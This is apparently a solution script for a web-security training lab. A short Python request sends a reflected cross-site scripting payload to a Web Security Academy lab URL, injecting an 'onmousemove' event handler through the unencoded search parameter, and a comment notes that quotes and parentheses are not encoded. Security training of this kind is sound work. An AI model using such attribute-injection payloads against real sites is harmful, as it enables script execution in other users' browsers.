import requests

url = "https://0a37008a0388b512c0a35977003a005c.web-security-academy.net/?search=%22onmousemove%3D%22alert%281%29%22"
solution = requests.get(url)
print(solution.content)

#explain: challenge not encode " and ()